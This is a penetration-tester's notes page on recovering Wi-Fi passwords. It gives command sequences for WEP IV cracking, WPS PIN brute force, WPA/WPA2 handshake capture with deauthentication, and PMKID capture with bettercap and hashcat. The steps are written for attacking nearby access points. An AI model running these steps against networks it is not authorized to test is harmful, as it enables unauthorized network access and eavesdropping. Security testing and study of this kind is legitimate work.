---
author(s):
  - Userware
tags:
  - initial-access
  - exploitation
  - wireless-attacks
credits:
  - atom
---
# 03 - Password Recovery

## WEP

### #aircrack-ng

Capture the packets from a wireless endpoint.

```
# airodump-ng --bssid <bssid> -c <channel> -w WEPcrack.cap mon0
```

Inject ARP to capture IVs

```
# aireplay-ng -e -b <bssid> -h <mac> mon0
```

Crack (needs several thousand IVs)

```
# aircrack-ng WEPcrack.cap
```

### #wifite2

```
# wifite2 -i wlan0 -c <channel> -b <bssid>
```

## WPS PIN Recovery

Many Wi-Fi APs were equipped with Wi-Fi Protected Setup, or WPS, to make it simpler for the average home user without knowledge of Wi-Fi security measures to set up their wireless AP. Fortunately for us, if we can crack that WPS PIN, we can then access the control panel of the AP.

This PIN is relatively simple; just eight digits with one being a checksum, leaving just seven (7) digits, or 10,000,000 possibilities. A single CPU can usually exhaust those possibilities in a few days. Although this might seem slow, brute-forcing the PSK with many times the possibilities can take much longer.

If the wireless AP has WPS enabled, this is the preferred method of cracking modern wireless APs with WPA2. You can use either the Reaver or Bully in conjunction with Aircrack-ng to break these WPS PINs.

A flaw in WPS, or WiFi Protected Setup, known about for over a year by TNS, was finally exploited with proof of concept code. Both TNS, the discoverers of the exploit and Stefan at `.braindump` have created their respective `reaver` and `wpscrack` programs to exploit the WPS vulnerability. From this exploit, the WPA password can be recovered almost instantly in plain-text once the attack on the access point WPS is initiated, which normally takes 2-10 hours (depending on which program you use).

This exploit defeats WPS via an intelligent brute force attack to the static WPS PIN. By guessing the PIN, the router will actually throw back, whether or not the first four digits (of eight) are correct. Then, the final number is a checking number used to satisfy an algorithm. This can be exploited to brute force the WPS PIN, and allow recovery of the WPA password in an incredibly short amount of time, as opposed to the standard attack on WPA.

> [!IMPORTANT] The Keys to Success
> It's important to note, though, that new APs no longer have this vulnerability. This attack will only work on APs sold during that window of 2006 and early 2012. Since many families keep their APs for many years, there are still many of these vulnerable ones around. Scan for an access point to attack, and copy its MAC address for later (`XX:XX:XX:XX:XX:XX`).

```
# iwlist scan wlan0
```

![[06 - Tactics & Techniques & Procedures Phases/C - Initial Access/0x00 - Exploitation/0xD - Wireless Attacks/Wi-Fi/01 - Scan Endpoints#^0fb3a8]]

![[06 - Tactics & Techniques & Procedures Phases/C - Initial Access/0x00 - Exploitation/0xD - Wireless Attacks/Wi-Fi/01 - Scan Endpoints#^e8cacb]]

### #wifite2

```
# wifite2 -i wlan0 -c <channel> -b <bssid> --wps
```

## WPA/WPA2

### #aircrack-ng

![[06 - Tactics & Techniques & Procedures Phases/C - Initial Access/0x00 - Exploitation/0xD - Wireless Attacks/Wi-Fi/01 - Scan Endpoints#^0fb3a8]]

![[06 - Tactics & Techniques & Procedures Phases/C - Initial Access/0x00 - Exploitation/0xD - Wireless Attacks/Wi-Fi/01 - Scan Endpoints#^e8cacb]]

![[06 - Tactics & Techniques & Procedures Phases/C - Initial Access/0x00 - Exploitation/0xD - Wireless Attacks/Wi-Fi/01 - Scan Endpoints#^7aff26]]

![[06 - Tactics & Techniques & Procedures Phases/C - Initial Access/0x00 - Exploitation/0xD - Wireless Attacks/Wi-Fi/01 - Scan Endpoints#^1242a4]]

Find the network you want to access then wait for a handshake (`WPA handshake: ##:##:##:##:##:##`).

```
# airodump-ng --bssid <bssid> -c 11 -w cowpatty.cap mon0
```

![[02 - Deauthentication#^bc473e]]

![[02 - Deauthentication#^f7a1ab]]

Load a dictionary list to crack the password.

```
# aircrack-ng WPAcrack.cap -w passwords.lst
```

Pipe STDIN to `aircrack-ng` for password cracking.

```
$ crunch <min-len> <max-len> -t <placeholder_characters> | aircrack-ng -w - file.cap -e <ESSID>
```

### #wifite2

```
# wifite2 -i wlan0 -c <channel> -b <bssid> --pms

# wifite2 -i wlan0 --wpa <bssid>
```

## PMKID Cracking

### #bettercap

PMKID, client-less and only ONE packet! No de-auth required. 4-way handshake that can be captured and cracked. When a client connects to the AP, there is a 4-way handshake where the pre-shared key (PSK) is transferred from the client machine to the AP. We can capture that PSK hash and then use a dictionary or brute-force attack against it. This can be time-consuming and is not always successful. Success is dependent upon the wordlist you use and the time you have to crack it. Once you have the hash of the PSK captured, you don't need to be connected to the AP. With enough resources, you can brute-force any PSK.

It turns out that a lot of modern routers append an optional field at the end of the first EAPOL frame sent by the AP itself when someone is associating, the so called Robust Security Network, which includes something called PMKID. The PMKID is derived by using data which is known to us:

```
PMKID = HMAC-SHA1-128(PMK, "PMK Name" | MAC_AP | MAC_STA)
```

Since the `"PMK Name"` string is constant, we know both the BSSID of the AP and the station and the PMK is the same one obtained from a full 4-way handshake, this is all `hashcat` needs in order to crack the PSK and recover the passphrase! This can be done in `bettercap` or possibly other tools.

```
$ sudo bettercap -iface wlan0
wifi.recon on
set wifi.show.sort clients desc
set ticker.commands 'clear; wifi.show'
ticker on
```

Now you'll be able to see a bunch of SSIDs that are being broadcast. Pick a channel of an SSID you want to attack:

```
wifi.recon.channel <channel>
```

Deauthenticate the wireless endpoint.

```
wifi.deauth <BSSID>
```

Send association request to every AP and see who'll respond with useful information:

```
wifi.assoc all
```

All nearby vulnerable routers will start sending their PMKID, which `bettercap` will dump to the usual `.pcap` file. Convert the PMKID data to a hash format for hashcap with `hcxpcaptool`:

```
$ hcxpcaptool -z bettercap-wifi-handshakes.pmkid /path/to/bettercap-wifi-handshakes.pcap
```

Now crack using hashcap `16800`.

```
$ hashcat -m 16800 -a 3 -w 3 bettercap-wifi-handshakes.pmkid '?d?d?d?d?d?d?d?d'
```

### #wifite2

```
# wifite2 -i wlan0 -b <bssid> --pmkid
```

---
## References

### Backlinks

- [[Crunch|Crunch]]

### Aircrack-ng

- [Aircrack-ng: Fake Authentication](https://aircrack-ng.org/doku.php?id=fake_authentication)

- [Aircrack-ng: Tutorial - How to crack WPA Migration Mode?](https://aircrack-ng.org/doku.php?id=wpa_migration_mode)

- [Aircrack-ng: Cafe Latte Attack](https://aircrack-ng.org/doku.php?id=cafe-latte)

### Delfirosales

- [Delfirosales: Cracking WPA/WPA2 con CoWPAtty & Aircrack-ng](https://delfirosales.blogspot.com/2011/12/cracking-wpawpa2-con-cowpatty-aircrack.html)

### Bettercap

- [Bettercap Modules: WiFi](https://www.bettercap.org/modules/wifi/)

### Evilsocket

- [Evilsocket: Pwning WPA/WPA2 Networks With Bettercap and the PMKID Client-Less Attack](https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/)

### Hashcat Forum

- [Hashcat Forum: New attack on WPA/WPA2 using PMKID](https://hashcat.net/forum/thread-7717.html)